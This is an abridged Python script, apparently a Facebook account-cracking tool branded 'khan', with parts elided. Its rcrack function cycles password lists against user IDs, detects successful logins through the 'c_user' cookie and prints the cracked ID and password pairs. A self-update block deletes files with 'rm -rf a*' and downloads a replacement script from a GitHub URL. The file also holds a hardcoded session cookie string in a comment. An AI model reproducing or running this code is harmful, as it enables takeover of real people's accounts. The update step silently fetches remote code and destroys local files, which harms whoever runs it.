...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/mkbrand014/khan/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/mkbrand014/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/mkbrand014/ali/main/khan.py > khan.py')
...
def usman():
	...
	if usman1 =='5':
		usman()
	if usman1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=1247732665816889')
	if usman1 =='4':
		os.system('xdg-open https://facebook.com/groups//');usman()
	if usman1 =='2':
		bangla()
	else:
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            # 'cookie': 'datr=V37XY3lZCFPKCaF_VWb19fEJ; sb=V37XYyYs1HbXZkR62kREw93L; m_pixel_ratio=2; wd=980x1541; fr=0RAOdMWBBCoDZJwby..Bj135X.9V.AAA.0.0.Bj2fzV.AWVyEZJLzT0',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;32m[khan -OK] '+uid+'|'+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[khan -CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.khan \033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
